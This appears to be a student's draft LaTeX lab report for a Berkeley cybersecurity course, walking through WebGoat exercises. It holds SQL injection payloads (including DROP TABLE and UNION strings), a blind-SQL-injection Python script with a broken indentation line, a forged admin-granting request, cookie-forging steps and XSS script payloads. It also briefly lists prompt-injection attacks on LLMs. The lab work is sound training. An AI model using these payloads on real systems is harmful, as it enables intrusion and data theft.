@@ -1,0 +1,517 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% APA Assignment Article
+% LaTeX Template
+% Version 2.0 (February 7, 2023)
+%
+% This template originates from:
+% https://www.LaTeXTemplates.com
+%
+% Author:
+% Vel (vel@latextemplates.com)
+%
+% License:
+% CC BY-NC-SA 4.0 (https://creativecommons.org/licenses/by-nc-sa/4.0/)
+%
+% NOTE: The bibliography needs to be compiled using the biber engine.
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%----------------------------------------------------------------------------------------
+%	PACKAGES AND OTHER DOCUMENT CONFIGURATIONS
+%----------------------------------------------------------------------------------------
+
+\documentclass[
+	letterpaper, % Paper size, use either a4paper or letterpaper
+	10pt, % Default font size, can also use 11pt or 12pt, although this is not recommended
+	unnumberedsections, % Comment to enable section numbering
+	twoside, % Two side traditional mode where headers and footers change between odd and even pages, comment this option to make them fixed
+]{APAAssignment}
+
+\addbibresource{bibliography.bib} % BibLaTeX bibliography file
+
+\runninghead{MICS CYBER 252, Fall-2024 Hands On Lab 1} % A shortened article title to appear in the running head, leave this command empty for no running head
+
+\footertext{\textit{Hands On Lab 1 (1.4.2)  } (MICS CYBER 252, Fall -2024)} % Text to appear in the footer, leave this command empty for no footer text
+
+\setcounter{page}{1} % The page number of the first page, set this to a higher number if the article is to be part of an issue or larger work
+
+%----------------------------------------------------------------------------------------
+%	TITLE SECTION
+%----------------------------------------------------------------------------------------
+
+\usepackage[title,toc,titletoc]{appendix}
+\usepackage{titlesec}
+\usepackage{lscape}
+\usepackage{fontawesome}
+
+\title{Hands-On lab 1 \\ MICS-252, Fall 2024} % Article title, use manual lines breaks (\\) to beautify the layout
+
+% Authors are listed in a comma-separated list with superscript numbers indicating affiliations
+% \thanks{} is used for any text that should be placed in a footnote on the first page, such as the corresponding author's email, journal acceptance dates, a copyright/license notice, keywords, etc
+% Affiliations are output in the \date{} command
+\date{UC Berkleley School of Information \\
+MICS Course 252 Fall 2024 (Kristy Westphal)
+}
+
+
+\author{
+	Prepared by: Karl-Johan Westhoff \\
+	email \href{mailto:kjwesthoff@berkeley.edu}{kjwesthoff@berkeley.edu}
+}
+
+
+% % Full-width abstract
+% \renewcommand{\maketitlehookd}{%
+% 	\begin{abstract}
+% 		\noindent Lorem ipsum dolor sit amet,rta porttitor.
+% 	\end{abstract}
+% }
+
+%----------------------------------------------------------------------------------------
+
+\begin{document}
+\onecolumn
+\maketitle % Output the title section
+
+%----------------------------------------------------------------------------------------
+%	ARTICLE CONTENTS
+%----------------------------------------------------------------------------------------
+
+\section{Introduction}
+
+
+\section{Lessons Learned}
+
+\section{Topics for Further Exploration}
+From our discussion in class and reviewing the OSSTMM 3 paper \cite{OSSTMM3} I would really like to explore standards and contracting best practices for pentesting. There are a lot of pitfalls and topics that legal departments will have a 'field day' with! In more 'classic' engineering consulting, contracts and frame agreements set bounds for liability usually capping the incurred possible damages to the sum of the consultancy contract (i.e. "we assume no responsibility of the advice or solutions we have come up with on this consultancy gig - use at your own risk") - I assume the same approach is used in pentesting contracts. \\ I will definitely keep an eye out when i come across examples of pentesting contracts.. 
+
+\subsection{Future of pentesting}
+Another thing I pondered on while doing the WbGoat labs was: "Surely no one would deploy websites with these vulnerabilities today". And there is some truth to this, best-practices and standardization such as SOC-2, ISO 27001, OWASP-ASVS \cite{OWASP-ASVS} 'weeds out' the most obvious mistakes. However, the industry itself reports (see \cite{Cobalt2024}) an uptick in pentesting activity, with a shift in activities towards AI.
+\subsubsection{Pemtesting and AI/LLM's}
+In various ways, companies providing AI services (chat-bots, prompts, search assistance etc.) constitutes a whole new avenue for pentesting services \cite{Cobalt2024}p.3-6: 
+ 
+\begin{itemize}
+	\item Prompt injection, where creative inputs gets the LLM ro reveal un-intended data  
+	\item Chatbot hallucination, giving dangerous advice that the company may be liable for
+	\item Denial of service type attacks, where an attack surface of prompts are given input that require large resources from the LLM  
+\end{itemize}
+
+OWASP have published a 'top 10' for LLM Applications \cite{OWASP-Top10-LLM}, in which the items above are included.
+
+\subsubsection{Code quality and copilots..} The youtuber ThePrimeagen has a funny comment to this topic in \cite{ThePrimaegenCyberStocksUp} "AI vs Cyber Security? - CyberSecurity stocks go'in up!" Reasoning being that "copilot will gloriously copy code with vulnerabilities" as it is trained on code from before which may hold vulnerabilities. I think this is true, especially in the "move fast and break stuff" tech industry where requirements for fast deployment overrule security (again a reason why standardization and regulation is important).    
+
+
+
+
+%----------------------------------------------------------------------------------------
+%	 REFERENCES
+%----------------------------------------------------------------------------------------
+\clearpage
+\printbibliography % Output the bibliography
+
+%----------------------------------------------------------------------------------------
+
+
+
+%----------------------------------------------------------------------------------------
+%	 Appendices
+%----------------------------------------------------------------------------------------
+
+
+\clearpage
+\begin{appendices}
+\onecolumn
+\appendix
+\section{Appendix} \label{Appendix}
+
+
+\hypertarget{webgoat-setup}{%
+\section{WebGoat Setup}\label{webgoat-setup}}
+
+WebGoat was set up on my `daily driver' Linux Mint, using the docker
+image following instructons
+
+\begin{figure}[!h] % Single column figure
+	\includegraphics[width=\linewidth]{Pasted image 20240823155542.png}
+	\caption{Docker Desktop}
+	\label{fig:Docker-Desktop}
+\end{figure}
+
+
+
+
+\hypertarget{webgoat-exercises}{%
+\section{WebGoat Exercises}\label{webgoat-exercises}}
+
+\hypertarget{introduction}{%
+\subsection{1. Introduction}\label{introduction}}
+
+Went through the tutorials for WebGoat and WebWolf: - Uploaded a file -
+Sent an password reset email from the WebGoat website and received it on
+WebWolf - Directed a http GET request from WebGoat to WebWolf with a
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240823161030.png}
+	\caption{WebGoat Intro Solved}
+	\label{fig:WebGoat Intro}
+\end{figure}
+
+
+
+\hypertarget{general}{%
+\subsection{2 General}\label{general}}
+
+\hypertarget{http-basics}{%
+\subsubsection{2.1 HTTP Basics}\label{http-basics}}
+
+Illustration of request and response 
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240823162927.png}
+	\caption{WebGoat Intro Js}
+	\label{fig:Intro Js}
+\end{figure}
+
+
+The request sent is a http POST, i found that in the browser tools
+Network pane. 
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240823163525.png}
+	\caption{The magic
+	number is found in an attribute in the html input tag\\}
+	\label{fig:MajickNo}
+\end{figure}
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240823163943.png}
+	\caption{The magic number  HTTP Proxies Used Burpsuite to complete the tutorial}
+	\label{fig:MajickNo Burp}
+\end{figure}
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240823184950.png}
+	\caption{Response}
+	\label{fig:MajickGET}
+\end{figure}
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.25\linewidth]{Pasted image 20240823204504.png}
+	\caption{General Completed}
+	\label{fig:HijackCookie}
+\end{figure}
+
+\section{3 Broken Access Control} 
+\subsection{3.1 Hijack a Session}
+The authentication system uses an access cookie (named `hijack-cookie'), consisting of a sequential number and a 	timestamp.}
+
+
+There is a login form on the 'Hijack a session' page, sending a Http post request to the server with a username/password to attempt Login. If a Http Request is sent to the server with random credentials and without a previously created hijack cookie, the server responds with a hijack-cookie, presumably treated as 'invalid' or 'anonymous' by the server when used, but the format and cookie generation is the same as for a valid cookie.
+
+When hitting the endpoint with multiple post requests, the sequential part of the cookie sometimes skips a number, indicating that a valid user has logged in between.
+
+We now know the sequence number and a range for the timestamp -- brute-force time! - using burp's 'Intruder' functionality. 
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240825092257.png}
+	\caption{I think the authors of this exercise have been so kind as to use the same timestamp as before the skip in sequence numbers. 
+	Anyway it is much easier to brute-force a sequence of numbers than to guess a username/password combination.
+	}
+	\label{fig:HijackCookieSolved}
+\end{figure}
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240825092622.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+\subsection{3.2 Insecure Direct Object References}
+Messing around I used burpsuite's proxy to intercept and manipulate the GET request to Tom, Cat. I got lucky on guessing Buffalo Bill's id 2342388 (it seemed logical), could have used the intruder from before, testing id's 2342380-23482389.   
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240825103852.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240825105558.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+\subsection{3.3 Missing Function Level Access Control}
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240825124029.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826110246.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+Changeing the http request on /access-control users to a post allows you to add users. Hack is to add a user with same username as you are logged in with, with admin set to 'true'
+
+\begin{verbatim}
+POST /WebGoat/access-control/users HTTP/1.1 Host: localhost:8080
+Content-Length: 69 sec-ch-ua: ``Chromium'';v=``127'',
+``Not)A;Brand'';v=``99'' Accept-Language: en-US Content-Type:
+application/json sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows
+NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Chrome/127.0.6533.100 Safari/537.36 Content-Type:
+application/x-www-form-urlencoded; charset=UTF-8 Accept: \emph{/}
+X-Requested-With: XMLHttpRequest sec-ch-ua-platform: ``Linux'' Origin:
+http://localhost:8080 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty Referer:
+http://localhost:8080/WebGoat/start.mvc?username=kjcyber252
+Accept-Encoding: gzip, deflate, br Cookie:
+JSESSIONID=9MdqtloBfxss7Zze227G7f3Q9DAVHbMsF8T5w5tj Connection:
+keep-alive
+
+\{ ``username'' :``kjcyber252'', ``password'' :"``,''admin" :true \}
+
+\end{verbatim}
+
+This allows for accessing the /access-control/users-admin-fix endpoint and get hash key for Jerry
+
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826125552.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826130101.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+\subsection{3.3 Spoofing an Authentication Cookie}
+Got the 2 hashes from logging in using the provided credentials:\\
+webgoat: NmQ2YzcyNDg1NTU2NDY3MjYyNjg3NDYxNmY2NzYyNjU3Nw==
+admin:      NmQ2YzcyNDg1NTU2NDY3MjYyNjg2ZTY5NmQ2NDYx
+
+The start is the same for both hashes:
+NmQ2YzcyNDg1NTU2NDY3MjYyNjg
+
+There are some '=' signs indicating Base64 encodig:
+Decoding to utf-8 (HEX) using https://www.base64decode.org/
+webgoat: 6d6c724855564672626874616f67626577
+admin:     6d6c72485556467262686e696d6461
+
+The above in plaintext using https://planetcalc.com/ gives:
+webgoat: mlrHUVFrbhtaogbew
+admin:    mlrHUVFrbhnimda
+
+Revealing the usernames in reverse, meaning that Tom' cookie must be:
+plaintext: mlrHUVFrbhmot
+Hex:  6d6c72485556467262686d6f74
+Base64: NmQ2YzcyNDg1NTU2NDY3MjYyNjg2ZDZmNzQ=
+
+Spoofing the endpoint: 
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826142028.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826142049.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+\section{4 Injection}
+\subsection{4.1 SQL Injection}
+Solutions for various parts:
+
+(2) SELECT * from employees where first_name='Bob' 
+(3) UPDATE employees SET  department='Sales' WHERE first_name = 'Tobi'
+(4) ALTER TABLE employees ADD phone varchar(20)
+(5)  GRANT ALL ON grant_rights TO unauthorized_user
+(9)
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826154614.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+(10) SELECT * From user_data WHERE Login_Count = 0 and userid= true
+(11) Employee Name: ' OR 1 = 1; --  TAN: ' '
+(12) '; UPDATE employees SET salary=99999 WHERE first_name='John
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826162409.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+
+(13) %'; DROP TABLE access_log;--
+
+
+\begin{figure} % Single column figure
+	\includegraphics[width=0.5\textwidth]{Pasted image 20240826163525.png}
+	\caption{}
+	\label{fig:HijackCookieSolvedCheck}
+\end{figure}
+
+\subsection{4.2 SQL Injection (advanced)}
+(3) a' union select user_system_data.*,NULL,NULL,NULL from user_system_data; --
+
+(5) Hint says that table-name is randomized and needs to be retrieved sounds like a blind SQL injection   
+
+The string `tom' AND substring(password,1,1)='t` 
+gives a 
+"User {0} already exists please try to register with a different username."
+Response indicating we hit correctly with 1 as the first letter of the pasword
+
+Automating this into a brute-force attack..
+```python
+import requests
+import json
+## Python script for 'blind' SQL injection
+
+url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"
+webgoat_session = "OYyd-Kr3f_erhZt5QnVA1-caG64u8PYxcXIt602C"
+
+header = {
+"Cookie": "JSESSIONID="+ webgoat_session,
+}
+password = ""
+
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+pw_index = 1
+for length in range(1,25):
+    for letter in alphabet:
+
+                payload = f"tom' AND SUBSTRING(password,{pw_index},1)='{letter}"
+        
+        data = {
+        'username_reg': payload,    
+        'email_reg': 'a@a', 
+        'password_reg': 'a',    
+        'confirm_password_reg': 'a'     
+        }
+
+        ## Do a request
+        r = requests.put(url,headers=header, data=data)
+        ## Grab the "feedback part of the response"
+        text = r.json()['feedback']
+        if "already exists" in text:
+            password += letter
+            pw_index +=1
+            print(password)
+\end{verbatim}
+
+Giving this result: {[}{[}Pasted image 20240827142530.png{]}{]}
+
+\hypertarget{cross-site-scripting}{%
+\subsubsection{4.4 Cross Site Scripting}\label{cross-site-scripting}}
+
+XSS (7) All the quantities only accepts integers, putting a
+\texttt{\textless{}script\textgreater{}} tags in something on ``three
+digit access code'' triggers an alert that page i being manipulated,
+putting
+\texttt{\textless{}script\textgreater{}alert(test)\textless{}/script\textgreater{}}
+works
+
+XSS(10) route handlers
+
+XSS (11) {[}{[}Pasted image 20240827163004.png{]}{]}
+
+\hypertarget{cross-site-scripting-stored}{%
+\subsubsection{Cross Site Scripting
+(Stored)}\label{cross-site-scripting-stored}}
+
+XSS(s)(3)
+\texttt{\textless{}script\textgreater{}\_webgoat.customjs.phoneHome\_()\textless{}/script\textgreater{}}
+
+\hypertarget{cross-site-scripting-mitigation}{%
+\subsubsection{Cross Site Scripting
+(Mitigation)}\label{cross-site-scripting-mitigation}}
+
+\begin{enumerate}
+\def\labelenumi{(\arabic{enumi})}
+\setcounter{enumi}{4}
+\tightlist
+\item
+\end{enumerate}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ErrorTok{\textless{}}\NormalTok{\%@ taglib uri="https://www.owasp.org/index.php/OWASP\_Java\_Encoder\_Project" prefix="e" \%\textgreater{}  }
+\DataTypeTok{\textless{}!DOCTYPE }\NormalTok{html}\DataTypeTok{\textgreater{}}  
+\KeywordTok{\textless{}html\textgreater{}}  
+\KeywordTok{\textless{}head\textgreater{}}  
+    \KeywordTok{\textless{}title\textgreater{}}\NormalTok{Using GET and POST Method to Read Form Data}\KeywordTok{\textless{}/title\textgreater{}}  
+\KeywordTok{\textless{}/head\textgreater{}}  
+\KeywordTok{\textless{}body\textgreater{}}  
+    \KeywordTok{\textless{}h1\textgreater{}}\NormalTok{Using POST Method to Read Form Data}\KeywordTok{\textless{}/h1\textgreater{}}  
+    \KeywordTok{\textless{}table\textgreater{}}  
+        \KeywordTok{\textless{}tbody\textgreater{}}  
+            \KeywordTok{\textless{}tr\textgreater{}}  
+                \KeywordTok{\textless{}td\textgreater{}\textless{}b\textgreater{}}\NormalTok{First Name:}\KeywordTok{\textless{}/b\textgreater{}\textless{}/td\textgreater{}}  
+                \KeywordTok{\textless{}td\textgreater{}}\NormalTok{$\{e:forHtml(param.first\_name)\}}\KeywordTok{\textless{}/td\textgreater{}}  
+            \KeywordTok{\textless{}/tr\textgreater{}}  
+            \KeywordTok{\textless{}tr\textgreater{}}  
+                \KeywordTok{\textless{}td\textgreater{}\textless{}b\textgreater{}}\NormalTok{Last Name:}\KeywordTok{\textless{}/b\textgreater{}\textless{}/td\textgreater{}}  
+                \KeywordTok{\textless{}td\textgreater{}}\NormalTok{$\{e:forHtml(param.last\_name)\}}\KeywordTok{\textless{}/td\textgreater{}}  
+            \KeywordTok{\textless{}/tr\textgreater{}}  
+        \KeywordTok{\textless{}/tbody\textgreater{}}  
+    \KeywordTok{\textless{}/table\textgreater{}}  
+\KeywordTok{\textless{}/body\textgreater{}}  
+\KeywordTok{\textless{}/html\textgreater{}}
+\end{Highlighting}
+\end{Shaded}
+
+\begin{enumerate}
+\def\labelenumi{(\arabic{enumi})}
+\setcounter{enumi}{5}
+\tightlist
+\item
+\end{enumerate}
+
+\begin{verbatim}
+public class AntiSamyController {  
+        public void saveNewComment(int threadID, int userID, String newComment)]
+        {  
+            Policy p = Policy.getInstance("antisamy-slashdot.xml");  
+            AntiSamy as = new AntiSamy();  
+            CleanResults cr = as.scan(newComment, p, AntiSamy.DOM);  
+            MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());  
+        }  
+    }
+\end{verbatim}
+
+
+
+
+
+
+\end{document}
